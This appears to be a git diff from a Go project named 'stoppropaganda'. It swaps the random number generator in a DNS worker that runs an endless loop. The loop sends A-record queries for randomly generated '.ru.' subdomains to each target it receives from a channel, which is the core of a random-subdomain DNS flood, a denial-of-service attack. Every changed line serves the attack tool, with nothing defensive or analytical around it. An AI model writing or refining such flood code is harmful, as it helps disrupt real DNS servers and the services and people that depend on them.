@@ -4,9 +4,9 @@ import (
 	"strings"
 	"sync"
 
+	"github.com/erkexzcx/stoppropaganda/internal/customprng"
 	"github.com/erkexzcx/stoppropaganda/internal/targets"
 	"github.com/miekg/dns"
-	"github.com/valyala/fastrand"
 )
 
 type DNSTargetStatus struct {
@@ -51,11 +51,11 @@ func startDNS() {
 }
 
 func runDNSWorker(c chan *DNSTarget) {
-	rng := &fastrand.RNG{}
+	rng := customprng.New(19) // max chars (15) + ".ru." (4) = 24
 	message := new(dns.Msg)
 	for {
 		dnsTarget := <-c
-		randomDomain := getRandomString(rng) + ".ru."
+		randomDomain := rng.StringSuffix(3, 15, ".ru.")
 		message.SetQuestion(randomDomain, dns.TypeA)
 		_, _, err := dnsClient.Exchange(message, dnsTarget.target)
 
